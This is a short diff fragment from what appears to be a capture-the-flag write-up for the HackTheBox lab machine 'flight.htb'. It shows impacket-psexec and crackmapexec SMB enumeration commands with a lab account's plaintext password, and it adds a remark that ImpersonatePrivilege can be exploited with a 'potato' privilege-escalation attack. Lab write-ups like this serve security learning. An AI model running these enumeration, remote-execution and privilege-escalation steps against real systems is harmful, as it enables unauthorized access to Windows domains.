@@ -211,7 +211,9 @@ impacket-psexec flight.htb/svc_apache@flight.htb
 ```s
 crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
 ```
-
+get user perms:
+![image](https://user-images.githubusercontent.com/19478700/215343484-a1ecf120-6ff2-4d4c-8645-e54ad367e00e.png)
+ImpersonatePriv can be exploited using potato
 **Kerbrute**
 
 Enumerate users:
